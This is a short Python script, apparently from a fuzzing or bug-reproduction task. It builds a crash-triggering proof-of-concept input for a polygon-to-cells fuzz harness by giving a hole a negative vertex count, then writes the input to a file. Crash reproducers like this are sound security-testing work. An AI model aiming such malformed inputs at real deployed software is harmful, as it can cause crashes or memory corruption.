import struct, math
# fuzzerPolygonToCellsExperimental inputArgs: int res, int numHoles, uint8_t buffer[1024]
b=bytearray()
b += struct.pack('<i', 0)  # res
b += struct.pack('<i', 1)  # numHoles
# outer loop numVerts=4, square-ish around origin
b += struct.pack('<i', 4)
verts=[(-0.01,-0.01),(-0.01,0.01),(0.01,0.01),(0.01,-0.01)]
for lat,lng in verts:
    b += struct.pack('<dd', lat, lng)
# hole with negative numVerts; no verts consumed
b += struct.pack('<i', -1)
# pad to harness nominal size
if len(b)<1032: b += bytes(1032-len(b))
open('/workspace/poc1.bin','wb').write(b)
PY
